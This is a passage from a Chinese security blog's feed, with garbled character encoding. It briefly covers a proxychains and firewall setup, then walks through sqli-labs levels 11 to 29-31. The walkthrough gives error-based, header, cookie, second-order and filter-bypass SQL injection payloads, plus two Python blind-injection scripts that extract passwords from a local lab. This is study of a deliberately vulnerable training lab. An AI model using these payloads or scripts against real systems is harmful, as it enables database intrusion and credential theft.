Gitæ³„éœ²ï¼ˆlogï¼Œstashï¼Œindexï¼‰_gitæ³„éœ²å¾—åˆ°index-CSDNåšå®¢</a></p><p>okç»“æŸï¼</p><h2 id="å¦å¤–"><a href="#å¦å¤–" class="headerlink" title="å¦å¤–"></a>å¦å¤–</h2><p><strong>ä½†æ˜¯TUNæ¨¡å¼å°±ä¸ç”¨è€ƒè™‘è¿™äº›7788çš„ä¸œè¥¿</strong></p><p>è¿˜å¯ä»¥ä½¿ç”¨<code>proxychains</code>è¿™ä¸ªæ¥èµ°ä»£ç†ï¼Œæ”¹è¿™ä¸ªæ–‡ä»¶&#x2F;etc&#x2F;proxychains4.conf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span> æŠŠè¿™é‡Œæ”¹æˆä½ ä¹‹å‰æˆåŠŸçš„é‚£ä¸ªç‰©ç† IP å’Œç«¯å£</span><br><span class="line">socks5  192.168.1.11  7897</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„ä½¿ç”¨å°±æ˜¯åŠ å‰ç¼€å°±å¥½äº†ï¼Œä¹‹å‰æ­å»ºéš§é“ç”¨çš„å°±æ˜¯è¿™ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains git clone https://github.com/...</span><br></pre></td></tr></table></figure><p>bydè‡ªå·±å†™è‡ªå·±åé¢æ¥ç”¨å‘ç°ä¸è¡Œï¼Œæ¼å†™äº†ä¸€ç‚¹å°±æ˜¯é˜²ç«å¢™çš„é—®é¢˜</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.1.11 7897</span><br></pre></td></tr></table></figure><p>å‘ç°æ­»æ´»è¿ä¸ä¸Šï¼Œå¯ä»¥pingé€šï¼Œé‚£ä¹ˆå°±æ˜¯è¯·æ±‚è¢«æ‹¦æˆªäº†ï¼Œé˜²ç«å¢™å¾—å…³äº†å‘ç°å¯ä»¥ï¼Œä¸ºäº†é•¿ä¹…ä¸€ç‚¹æˆ‘ä»¬é…ç½®ä¸€ä¸‹å…¥ç«™è§„åˆ™:</p><ol><li><strong>æ‰“å¼€è®¾ç½®</strong>ï¼šç‚¹å‡»â€œé«˜çº§è®¾ç½®â€ï¼ˆå°±åœ¨ä½ æˆªå›¾é‡Œçš„é‚£ä¸ªâ€œé˜²ç«å¢™å’Œç½‘ç»œä¿æŠ¤â€ç•Œé¢çš„æœ€ä¸‹æ–¹ï¼‰ã€‚</li><li><strong>æ–°å»ºè§„åˆ™</strong>ï¼šåœ¨å¼¹å‡ºçš„çª—å£å·¦ä¾§ç‚¹å‡»â€œ<strong>å…¥ç«™è§„åˆ™</strong>â€ï¼Œç„¶ååœ¨å³ä¾§ç‚¹å‡»â€œ**æ–°å»ºè§„åˆ™â€¦**â€ã€‚</li><li><strong>é€‰æ‹©ç±»å‹</strong>ï¼šé€‰æ‹©â€œ<strong>ç«¯å£</strong>â€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li><li><strong>åè®®å’Œç«¯å£</strong>ï¼šé€‰æ‹©â€œ<strong>TCP</strong>â€ï¼Œå¹¶åœ¨â€œç‰¹å®šæœ¬åœ°ç«¯å£â€ä¸­è¾“å…¥ <code>7897</code>ã€‚</li><li><strong>æ“ä½œ</strong>ï¼šé€‰æ‹©â€œ<strong>å…è®¸è¿æ¥</strong>â€ã€‚</li><li><strong>é…ç½®æ–‡ä»¶</strong>ï¼šé»˜è®¤å…¨é€‰ï¼ˆåŸŸã€ä¸“ç”¨ã€å…¬ç”¨ï¼‰ã€‚</li><li><strong>åç§°</strong>ï¼šèµ·ä¸ªåå­—ï¼Œæ¯”å¦‚ <code>Allow_Kali_7897</code>ï¼Œç‚¹å‡»å®Œæˆã€‚</li></ol><p>é‚£ä¹ˆåŒä¸€å±€åŸŸç½‘ä¸‹å°±éƒ½å¯ä»¥è®¿é—®7897è¿™ä¸ªç«¯å£äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> GitHack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master</title>
      <link href="/2025/12/22/sqli-labs-master/"/>
      <url>/2025/12/22/sqli-labs-master/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>å°±æ˜¯ä¸€ä¸ªpostæ³¨å…¥æµ‹å‡ºé—­åˆæ–¹å¼ä¸ºå•å¼•å·ï¼Œæ²¡æœ‰è¿‡æ»¤</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>æµ‹å‡ºé—­åˆæ–¹å¼ä¸ºâ€)ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>æµ‹å‡ºé—­åˆæ–¹å¼ä¹‹åæ— å›æ˜¾ä¼˜å…ˆå°è¯•æŠ¥é”™æ³¨å…¥updatexmlï¼Œä¾æ—§æ²¡æœ‰è¿‡æ»¤</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>é—­åˆæ–¹å¼å˜äº†ï¼ŒæŠ¥é”™æ³¨å…¥ä¾ç„¶å¯ä»¥</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>ä¸€å¼€å§‹æµ‹é—­åˆæ²¡æµ‹å‡ºæ¥ï¼Œå› ä¸ºä¸ç®¡æˆ‘ç”¨ä»€ä¹ˆéƒ½æ²¡å‘ç°æŠ¥é”™ï¼Œç´¢æ€§å°±æ˜¯ç›´æ¥sqlmapå»è¯•ä¸€ä¸‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-15/ --forms</span><br></pre></td></tr></table></figure><p>sqlmapç¡®å®è·‘å‡ºæ¥äº†ï¼Œé—­åˆæ–¹å¼æ˜¯å•å¼•å·ï¼Œä½†æ˜¯æ²¡æœ‰è¯­æ³•æŠ¥é”™çš„å›æ˜¾</p><p><img src="/../images/achieve/2025/12/image-20251222220207921.png" alt="image-20251222220207921"></p><p>è¿™å°±æ„å‘³ç€å®ƒå¯¹è¯­æ³•é”™è¯¯çš„ä¸€ä¸ªéšè—ï¼Œè¿™æ˜¯ä½ å°±æ˜¯ä¸èƒ½å•ç‹¬çš„å»fuzzå®ƒçš„å•å¼•å·äº†ï¼Œåˆ©ç”¨å¸ƒå°”ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span></span><br><span class="line">success_mark = <span class="string">&quot;flag.jpg&quot;</span>  <span class="comment"># ç™»å½•æˆåŠŸæ—¶é¡µé¢åŒ…å«çš„å…³é”®è¯</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">                <span class="keyword">if</span> success_mark <span class="keyword">in</span> response.text:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt;= <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] æ­£åœ¨çŒœè§£ç¬¬ <span class="subst">&#123;i&#125;</span> ä½: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] æœ€ç»ˆç»“æœ: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    inject()</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>é—­åˆæ–¹å¼å˜æˆäº†â€)ï¼Œä¾æ—§æ˜¯æ— å›æ˜¾ï¼ŒæŠ¥é”™æ³¨å…¥ä¸è¡Œï¼Œé‚£ä¹ˆå°±æ˜¯å¸ƒå°”ç›²æ³¨</p><h2 id="Less-17-updateæ³¨å…¥"><a href="#Less-17-updateæ³¨å…¥" class="headerlink" title="Less-17(updateæ³¨å…¥)"></a>Less-17(updateæ³¨å…¥)</h2><p>å¼€å§‹åœ¨unameæµ‹è¯•å•¥ä¹Ÿæ²¡æµ‹å‡ºæ¥ï¼Œç„¶åå°±çœ‹æºç å»äº†ï¼è¿™é‡Œå°±æ˜¯æˆ‘å°ä¸‘äº†ï¼Œæ›´æ–°å¯†ç è¿™ç©æ„å°±åº”è¯¥æƒ³åˆ°updateï¼Œçœ‹äº†æºç unameæœ‰è¿‡æ»¤ï¼Œå…ˆä¸è€ƒè™‘</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>update=&quot;UPDATE users SET password = &#x27;<span class="built_in">$</span>passwd&#x27; WHERE username=&#x27;<span class="built_in">$</span>row1&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„passwdæ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‰“</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd=1111&#x27; and updatexml(2,concat(0x7e,(select password from users)),0)<span class="params">#</span><span class="built_in">&amp;</span>submit=Submit<span class="built_in">&amp;</span>uname=admin</span><br><span class="line"></span><br><span class="line">You can&#x27;t specify target table &#x27;users&#x27; for update in FROM clause</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯è¡¨å†²çªäº†ï¼Œå°±æ˜¯ä½ updateçš„è¡¨å’Œä½ selectæŸ¥è¯¢çš„è¡¨é‡å¤äº†ï¼Œç”¨ä¸€ä¸‹åµŒå¥—</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1111&#x27; and updatexml(2,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from (select password from users) as temp)),0)<span class="params">#</span><span class="built_in">&amp;</span>submit=Submit<span class="built_in">&amp;</span>uname=admin</span><br></pre></td></tr></table></figure><p><strong>å…³é”®æ˜¯ï¼šé»‘ç›’æƒ³åˆ°updateï¼Œè¿˜æœ‰å°±æ˜¯åµŒå¥—å»é¿å…å†²çª</strong></p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>é»‘ç›’æ‰“ä¸å‡ºï¼Œè¿˜æ˜¯å»çœ‹æºç æ‰“çš„ï¼Œåœ¨UAå¤´å¯ä»¥æ³¨å…¥ï¼Œæ³¨æ„å¾—å…ˆç™»å½•è¿›å»</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:11111&#x27; and updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from users)),1), 123, &#x27;rufeii&#x27;)<span class="params">#</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨åˆ«äººé‚£å­¦åˆ°</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç›¸å½“äºå°±ä¸ç”¨å»è€ƒè™‘æ’å…¥äº†å‡ æ¡æ•°æ®</p><p>ç™½ç›’æ‰“å‡ºæ¥äº†ï¼Œæƒ³æƒ³é»‘ç›’çš„æ€è·¯ï¼ˆæœ‰ç‚¹äº‹åè¯¸è‘›äº®äº†ï¼‰</p><p><img src="/../images/achieve/2025/12/image-20251223211536324.png" alt="image-20251223211536324"></p><p>æ²¡æœ‰ä»»ä½•æ“ä½œå°±æ˜¯æ¥äº†ipï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯æ²¡æœ‰è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ä¹‹å‰å°±æ˜¯è·å–äº†ipï¼Œç„¶åè¯•äº†ä¸€ä¸‹æ²¡æœ‰xffæ³¨å…¥ã€‚åº”è¯¥æ˜¯è¦ç™»å½•è¿›å»ï¼Œä¸ç™»å½•çš„è¯â€¦â€¦â€¦</p><p>ä½ ä¸ç®¡æ˜¯xffå’ŒUAå¤´è¿›è¡Œæ³¨å…¥ï¼Œå®ƒæ— éå°±æ˜¯ä¸¤ç§åœºæ™¯ï¼š1ï¼Œé™åˆ¶è®¿é—® 2ï¼Œè®°å½•æ—¥å¿—</p><p>è¿™é‡Œçš„è¯å°±æ˜¯è€ƒè™‘è®°å½•ï¼Œé‚£ä½ è®°å½•çš„è¯ä¸€èˆ¬æ˜¯è·Ÿç”¨æˆ·ä¸€èµ·è®°å½•çš„å¯¹å§ï¼Œæ‰€ä»¥è‚¯å®šè¦å…ˆç™»å½•ï¼Œç™»å½•ä¹‹åæµ‹å‡ºæ³¨å…¥ç‚¹å°±æ˜¯å»çŒœåç«¯è¯­å¥äº†</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>Refereræ³¨å…¥</p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>cookieæ³¨å…¥</p><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>cookieå˜æˆäº†base64åŠ å¯†</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>åŒ 21 ï¼Œå•å¼•å·æ¢æˆåŒå¼•å·å³å¯</p><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>æ³¨é‡Šç¬¦æ²¡äº†ï¼Œé—­åˆå°±å¥½</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from users)),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>é¦–å…ˆæ³¨å†Œç”¨æˆ·ç™»å½•è¿›å»ï¼Œæœ‰ä¸ªä¿®æ”¹å¯†ç çš„æ“ä½œï¼Œç¬¦åˆäºŒæ¬¡æ³¨å…¥çš„æµ‹è¯•æ¡ä»¶ï¼Œä½†æ˜¯æ³¨å†Œç”¨æˆ·é‚£é‡Œé™åˆ¶äº†å­—é•¿åªèƒ½20ä¸ªï¼Œè¿™å°±ä¸å¥½åŠäº†ï¼Œä½†æ˜¯å¯ä»¥æ”¹å…¶å®ƒç”¨æˆ·çš„å¯†ç </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œç”¨æˆ·&#x27;or&#x27;1&#x27;=&#x27;1&#x27;<span class="params">#</span></span><br></pre></td></tr></table></figure><p>æ”¹å¯†ç å°±å…¨éƒ¨æ”¹äº†</p><p><img src="/../images/achieve/2025/12/image-20251226171429344.png" alt="image-20251226171429344"></p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>è¿‡æ»¤orå’Œandï¼Œå…¶å®ä¸ç„¶å…¶å®æ˜¯ç½®ç©ºè¿™ä¸¤ä¸ªç©æ„ï¼Œæ‰€ä»¥ç›´æ¥åŒå†™ç»•è¿‡å³å¯</p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>å­—ç¬¦å‹æ³¨å…¥ï¼Œå…¶å®ƒä¸ä¸Šé¢˜å·®ä¸å¤š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,2,4<span class="comment">%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-26-æ— ç©ºæ ¼å’Œæ³¨é‡Šç¬¦"><a href="#Less-26-æ— ç©ºæ ¼å’Œæ³¨é‡Šç¬¦" class="headerlink" title="Less-26(æ— ç©ºæ ¼å’Œæ³¨é‡Šç¬¦)"></a>Less-26(æ— ç©ºæ ¼å’Œæ³¨é‡Šç¬¦)</h2><p>é¢˜ç›®ä¸èƒ½ç”¨ç©ºæ ¼äº†ï¼Œç©ºæ ¼çš„æ›¿ä»£å“ä¹Ÿæ²¡æœ‰äº†ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½ä¸ç”¨ç©ºæ ¼å‘¢ï¼Ÿé‚£å°±ç”¨é€»è¾‘ç¬¦||å’Œ&amp;&amp;ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨æŠ¥é”™æ³¨å…¥ï¼Œæ³¨é‡Šä¹Ÿä¸èƒ½ç”¨ï¼Œé‚£å°±é—­åˆ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¡¨ï¼š1&#x27;||updatexml(1,concat(0x7e,(select(group<span class="built_in">_</span>concat(table<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.tables)where(table<span class="built_in">_</span>schema=database()))),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">å­—æ®µï¼š?id=1&#x27;||updatexml(1,concat(0x7e,(select(group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.columns)where(table<span class="built_in">_</span>schema=database()<span class="comment">%26%26table_name=&#x27;users&#x27;))),1)||&#x27;1&#x27;=&#x27;1</span></span><br></pre></td></tr></table></figure><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>æŠ¥é”™æ²¡æœ‰äº†ï¼Œæäº†åŠå¤©ï¼Œç›´æ¥å¸ƒå°”ç›²æ³¨ï¼Œä¸€å¼€å§‹&amp;&amp;åœ¨è„šæœ¬é‡Œæ²¡ç¼–ç ï¼Œæœ€ç»ˆé€æ­¥æ’é”™åˆ°ï¼Œä¸€èˆ¬éƒ½æ˜¯äºŒåˆ†æ³•</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-26a/&quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 126</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:                          <span class="params">#</span>ç”±äºç¡®å®šflagä¸€å®šåœ¨å¯è§å­—ç¬¦çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥ç­‰å·¦å³æŒ‡é’ˆé‡åˆæ—¶ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦äº†</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1                <span class="params">#</span>ç­‰ä»·äº(head+tail)//2æ•´æ•°é™¤æ³•</span><br><span class="line">        payload = f&quot;?id=0&#x27;||if(ascii(substr((select(group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.columns)where(table<span class="built_in">_</span>schema=database()<span class="comment">%26%26table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&#x27;1&#x27;=&#x27;2&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        if &quot;Your Password:999&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    if head != 32:                                    <span class="params">#</span>ç”¨äºåˆ¤æ–­æ˜¯å¦æ‰¾å®Œäº†flag</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br><span class="line"><span class="params">#</span>äºŒåˆ†æ³•è„šæœ¬</span><br></pre></td></tr></table></figure><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>è¿‡æ»¤çš„ä¸å…¨ï¼Œæ³¨é‡Šæ²¡æœ‰äº†ç”¨%00æˆªæ–­</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=00000&#x27;<span class="comment">%0aUniOn%0aSeLect%0a1,2,(selECt%0agroup_concat(username,%27:%27,password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>â€œé—­åˆ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=999999&quot;<span class="comment">%0aUnioN%0aSelecT%0a1,2,(selECt%0agroup_concat(username,%27:%27,password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>å½“ä½ å‘ç°æ³¨å…¥è¯­å¥æ²¡ä»€ä¹ˆé—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹é—­åˆæ–¹å¼çš„é—®é¢˜</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;(1&#x27;||&#x27;1&#x27;=&#x27;1)&#x27;å¦‚æœé—­åˆæ–¹å¼æ˜¯&#x27;()&#x27;ï¼Œä½ ç”¨1&#x27;||&#x27;1&#x27;=&#x27;1ä¹Ÿæ˜¯å¯ä»¥çš„</span><br><span class="line">?id=1&#x27;)<span class="comment">%0aorder%0aby%0a3;%00</span></span><br><span class="line">åé¢ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆéš¾åº¦</span><br></pre></td></tr></table></figure><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[<span class="keyword">\/</span><span class="keyword">\*</span>]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//strip out /*</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[--]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//Strip out --.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[<span class="params">#</span>]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//Strip out <span class="params">#</span>.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[ +]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/select/m&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[ +]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=000&#x27;)<span class="comment">%0auniounion selectn select%0a1,2,(select%0agroup_concat(password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><p><code>preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);</code>è¿™ç©æ„ä¹Ÿå¯ä»¥åŒå†™è¿‡ï¼Œç½®ç©ºå°±åŒå†™å°±å®Œäº‹äº†XD</p><h2 id="Less-29-31"><a href="#Less-29-31" class="headerlink" title="Less-29~31"></a>Less-29~31</h2><p>ç¯å¢ƒæ‡’å¾—æ­å»ºäº†ï¼Œè¿™é¢˜æ˜¯ä¸¤å±‚æœåŠ¡å™¨æ¶æ„</p><blockquote><p>åœ¨è¿™ç§æ¶æ„ä¸­ï¼ŒæœåŠ¡å™¨ç«¯é€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä¸€ä¸ªæ˜¯ä»¥Tomcatä¸ºå¼•æ“çš„JSPå‹æœåŠ¡å™¨ï¼Œå¦ä¸€ä¸ªæ˜¯ä»¥Apacheä¸ºå¼•æ“çš„PHPæœåŠ¡å™¨ã€‚åœ¨å®é™…è¿ä½œä¸­ï¼ŒçœŸæ­£æä¾›WebæœåŠ¡çš„æ˜¯PHPæœåŠ¡å™¨ã€‚å½“å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œé¦–å…ˆèƒ½å¤Ÿç›´æ¥è®¿é—®åˆ°TomcatæœåŠ¡å™¨ï¼Œç„¶åTomcatæœåŠ¡å™¨å†å‘ApacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚</p></blockquote><p>è¿™ç§æ¶æ„ä¸¤ç§æœåŠ¡å™¨å¯¹ç›¸åŒè¯·æ±‚å‚æ•°å…·æœ‰ä¸åŒçš„å¤„ç†ç‰¹æ€§ï¼Œtomcatè§£æç›¸åŒè¯·æ±‚å‚æ•°çš„ç¬¬ä¸€ä¸ªï¼Œapacheå–ç¬¬äºŒä¸ªï¼Œä»è€Œç»•è¿‡tomcatçš„waf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="built_in">&amp;</span>id=0&#x27; union select 1,group<span class="built_in">_</span>concat(schema<span class="built_in">_</span>name),2 from information<span class="built_in">_</span>schema.schemata;<span class="comment">%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-32"><a href="#Less-32" class="headerlink" 